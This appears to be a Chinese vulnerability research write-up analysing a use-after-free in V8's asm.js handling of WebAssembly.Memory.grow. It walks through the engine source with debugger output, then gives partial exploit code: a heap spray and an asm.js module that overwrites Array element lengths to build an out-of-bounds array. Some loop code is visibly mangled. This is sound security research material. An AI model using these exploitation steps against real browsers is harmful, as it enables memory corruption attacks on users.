     - prototype = 0x5c508ac5
     - elements = 0x2de8412d  [HOLEY_SMI_ELEMENTS]
     - embedder fields: 2
     - backing_store = (nil)
     - byte_length = 0
     - external
     - neuterable
     - neutered
     - wasm_buffer
     - properties = 0x2de8412d  {}
     - embedder fields = {
        (nil)
        (nil)
     }
ArrayBuffer的一些指针确实被清空掉了，但是`asm.js`里访问时仍然使用了原来那个指针，这是一个`UAF`。
###  asm.js的UAF成因分析
在分析这个UAF之前，我们先大致了解一下`asm.js`的编译过程，一个比较关键的地方是位于`src/wasm/module-compiler.cc`文件中的`InstanceBuilder::Build`函数，第`1792`行开始，获取外部传入的`ArrayBuffer`对象，并设置一些属性
       1792   if (!memory_.is_null()) {
       1793     Handle memory = memory_.ToHandleChecked();
       1794     // Set externally passed ArrayBuffer non neuterable.
     ► 1795     memory->set_is_neuterable(false);
       1796     memory->set_is_wasm_buffer(true);
       1797 
       1798     DCHECK_IMPLIES(trap_handler::UseTrapHandler(),
       1799                    module_->is_asm_js() || memory->has_guard_region());
       1800   } else if (initial_pages > 0) {
然后第`1838`行开始，进行一些检查，然后将`ArrayBuffer`对象设置到`instance`实例中。
       1838   Address mem_start = nullptr;
       1839   uint32_t mem_size = 0;
       1840   if (!memory_.is_null()) {
       1841     Handle memory = memory_.ToHandleChecked();
       1842     mem_start = static_cast(memory->backing_store());
     ► 1843     CHECK(memory->byte_length()->ToUint32(&mem_size));
       1844     LoadDataSegments(mem_start, mem_size);
       1845     // Just like with globals, we need to keep both the JSArrayBuffer
       1846     // and save the start pointer.
       1847     instance->set_memory_buffer(*memory);
       1848   }
然后第`1854`行，使用`WasmMemoryObject::New`创建了一个`memory_object`，并将其设置到`instance`实例中
    In file: /home/sea/Desktop/v8/src/wasm/module-compiler.cc
       1853   if (module_->has_memory && !instance->has_memory_object()) {
       1854     Handle memory_object = WasmMemoryObject::New(
       1855         isolate_,
       1856         instance->has_memory_buffer() ? handle(instance->memory_buffer())
       1857                                       : Handle::null(),
     ► 1858         module_->maximum_pages != 0 ? module_->maximum_pages : -1);
       1859     instance->set_memory_object(*memory_object);
       1860   }
接下来为新创建的`memory_object`设置`instance`
       1904 
       1905   //--------------------------------------------------------------------------       1906   // Add instance to Memory object
       1907   //--------------------------------------------------------------------------       1908   if (instance->has_memory_object()) {
     ► 1909     Handle memory(instance->memory_object(), isolate_);
       1910     WasmMemoryObject::AddInstance(isolate_, memory, instance);
       1911   }
       1912 
    pwndbg> p memory
    $10 = {
       = {
        location_ = 0x5671d6ac
      }, }
    pwndbg> p *memory
    $11 = (v8::internal::WasmMemoryObject *) 0x5b498b29
执行完后，该`memory_object`调用`has_instances`会返回`true`，说明已经为该`memory_object`设置好了实例
    pwndbg> p instance->memory_object()->has_instances()
    $13 = true
在分析完`asm.js`模块的编译过程以后，我们再来看一下JS层的`grow`函数。该函数的实现位于`src/wasm/wasm-js.cc`文件中的`WebAssemblyMemoryGrow`函数。第`745`行`EXTRACT_THIS(receiver,
WasmMemoryObject);`获取到了js层的`var memory = new
WebAssembly.Memory({initial:200});`这个对象。显然，在这里也表示为一个·`WasmMemoryObject`
       740   i::Isolate* i_isolate = reinterpret_cast(isolate);
       741   HandleScope scope(isolate);
       742   i::wasm::ScheduledErrorThrower thrower(i_isolate,
       743                                          "WebAssembly.Memory.grow()");
       744   Local context = isolate->GetCurrentContext();
     ► 745   EXTRACT_THIS(receiver, WasmMemoryObject);
       746 
       747   int64_t delta_size = 0;
       748   if (!args[0]->IntegerValue(context).To(&delta_size)) return;
       749 
       750   int64_t max_size64 = receiver->maximum_pages();
然后这里获取到ArrayBuffer对象以及一些属性，并在旧的size基础上加上增量以后进行一些范围检查。
    In file: /home/sea/Desktop/v8/src/wasm/wasm-js.cc
       752       max_size64 > static_cast(i::FLAG_wasm_max_mem_pages)) {
       753     max_size64 = i::FLAG_wasm_max_mem_pages;
       754   }
       755   i::Handle old_buffer(receiver->array_buffer());
       756   uint32_t old_size =
     ► 757       old_buffer->byte_length()->Number() / i::wasm::kSpecMaxWasmMemoryPages;
       758   int64_t new_size64 = old_size + delta_size;
       759   if (delta_size (delta_size));
       766   if (ret == -1) {
       767     thrower.RangeError("Unable to grow instance memory.");
       768     return;
       769   }
在`WasmMemoryObject::Grow`函数里，通过一些检查以后，就调用`GrowMemoryBuffer`来分配一块更大的内存了。
       476   uint32_t maximum_pages = FLAG_wasm_max_mem_pages;
       477   if (memory_object->has_maximum_pages()) {
       478     maximum_pages = Min(FLAG_wasm_max_mem_pages,
       479                         static_cast(memory_object->maximum_pages()));
       480   }
     ► 481   new_buffer = GrowMemoryBuffer(isolate, old_buffer, pages, maximum_pages);
       482   if (new_buffer.is_null()) return -1;
接下来来到这里，漏洞关键点来了
     ► 484   if (memory_object->has_instances()) {
       485     Handle instances(memory_object->instances(), isolate);
       486     for (int i = 0; i Length(); i++) {
       487       Object* elem = instances->Get(i);
       488       if (!elem->IsWasmInstanceObject()) continue;
       489       Handle instance(WasmInstanceObject::cast(elem),
    pwndbg> p memory_object->has_instances()
    $17 = false
因为这里的`memory_object`来自与JS层的那个`memory`对象，而不是在`InstanceBuilder::Build`函数中创建的那个，因此`memory_object->has_instances()`返回的是`false`。  
这意味着下面的代码不会执行
      if (memory_object->has_instances()) {
        Handle instances(memory_object->instances(), isolate);
        for (int i = 0; i Length(); i++) {
          Object* elem = instances->Get(i);
          if (!elem->IsWasmInstanceObject()) continue;
          Handle instance(WasmInstanceObject::cast(elem),
                                              isolate);
          SetInstanceMemory(isolate, instance, new_buffer);
        }
      }
由于`SetInstanceMemory(isolate, instance,
new_buffer);`没有执行，导致`wasm`的实例里保存的那个`buffer`仍然是最开始那个`buffer`的地址，没有将`new_buffer`更新进去。此时程序继续执行，更新JS层的`memory`对象
       494   memory_object->set_array_buffer(*new_buffer);
     ► 495   return old_size / WasmModule::kPageSize;
接下来是对`old_buffer`进行处理
       770   if (!old_buffer->is_shared()) {
       771     // When delta_size == 0, or guard pages are enabled, the same backing store
       772     // is used. To be spec compliant, the buffer associated with the memory
       773     // object needs to be detached. Setup a new buffer with the same backing
       774     // store, detach the old buffer, and do not free backing store memory.
     ► 775     bool free_memory = delta_size != 0 && !old_buffer->has_guard_region();
       776     if ((!free_memory && old_size != 0) || new_size64 == 0) {
       777       i::WasmMemoryObject::SetupNewBufferWithSameBackingStore(
       778           i_isolate, receiver, static_cast(new_size64));
       779     }
       780     i::wasm::DetachMemoryBuffer(i_isolate, old_buffer, free_memory);
我们跟进`DetachMemoryBuffer`函数，这里将`old_buffer`的`backing_store`给释放掉了。
    In file: /home/sea/Desktop/v8/src/wasm/wasm-memory.cc
       120       // We need to free the memory before neutering the buffer because
       121       // FreeBackingStore reads buffer->allocation_base(), which is nulled out
       122       // by Neuter. This means there is a dangling pointer until we neuter the
       123       // buffer. Since there is no way for the user to directly call
       124       // FreeBackingStore, we can ensure this is safe.
     ► 125       buffer->FreeBackingStore();
       126     }
       127   }
       128   buffer->set_is_neuterable(true);
       129   buffer->Neuter();
       130 }
可以看出，由于没有更新`wasm`实例里的`ArrayBuffer`对象，并且后面该`ArrayBuffer`被释放，由此导致了UAF的产生，原来`backing_store`的内存空间被`unmmap`掉了，使得其不再出现在映射表中。当我们再次访问这块内存时，便出现了段错误。
## 0x03 漏洞利用
###  概述
现在，我们制造出了一个UAF，但是`backing_store`的内存与一般对象的内存地址是分开的，不能指望将其他对象占位与此。与`backing_store`类似的是`Array`的`Element`，它们都属于大容量存储，因此它们之间很可能会分配到相邻的地址或者地址相差较小的位置。因此，我们可以考虑使用`Heap
Spray`技术，在`backing_store`地址附近都布局下`Array`的`Element`对象，然后通过`UAF`去控制。由于64位内存空间太大，`Heap
Spray`似乎无法成功将`Element`对象放到`backing_store`地址附近，因此这个漏洞目前仅在32位下成功利用。
###  何时进行 Heap Spray
我们需要寻找一个合适的时机进行`Heap Spray`，在`asm.js`模块的汇编代码中，我们注意到如下代码
    0x255062c0     0  55             push ebp
    0x255062c1     1  89e5           mov ebp,esp
    0x255062c3     3  56             push esi
    0x255062c4     4  57             push edi
    0x255062c5     5  8b4508         mov eax,[ebp+0x8]
    0x255062c8     8  e8d303b035     call 0x5b0066a0  (ToNumber)    ;; code: BUILTIN
    0x255062cd     d  a801           test al,0x1
    0x255062cf     f  0f8528000000   jnz 0x255062fd  
    0x255062d5    15  d1f8           sar eax,1
    .....................
可以看到，因为我们在`asm.js`模块中声明`x = x |
0;`，所以会先调用`ToNumber`获取对象`x`的值，而`ToNumber`会调用对象内部的`toString`函数，因此，我们可以重写`toString`函数，并在`toString`函数里开始`Heap
Spray`。
    //堆喷
    var victim_array = [];
    victim_array.length = 0x750;
    var array = [1.1];
    array.length = 0x10000;
    array.fill(2.2);
    function spray_heap() {
        for(var i = 0;i  x /20wx 0xf4d84108-0x8
    0xf4d84100:    0x536846f1    0x00020000    0x9999999a    0x40019999
我们可以将所有的可能偏移都罗列出来，由于这些偏移在之前那个`ArrayBuffer`的length范围之内，也就是说该对象存在于那个UAF的空间里，于是我们可以利用UAF来改写`Element`，我们可以修改`Element`的`length`属性，这样，我们可以后续构造出一个`oob`数组，为了区别，我们还需要修改`Element`的第一个元素，这样方便我们找到到底是哪个`Array`的`Element`堆喷于此处。  
为了方便罗列这些可能的偏移，并进行写，我们使用JS的模板来生成多种可能的偏移写语句，方便操作
    //距离不是固定的，因此需要将所有可能的距离都赋值,我们要修改Element的length和第一个元素
    let loop = "";
    for(let i = 0; i < 0xd0; i++) {
        loop += `fl[${0x21041 + 0x100 * i}] = x;fl[${0x21042 + 0x100 * i}] = x;`;
    }
    let eval_str = `
    function module(stdlib, foreign, buffer) {
        "use asm";
        var fl = new stdlib.Uint32Array(buffer);
        function foo(x) {
            x = x | 0;
            ${loop}
        }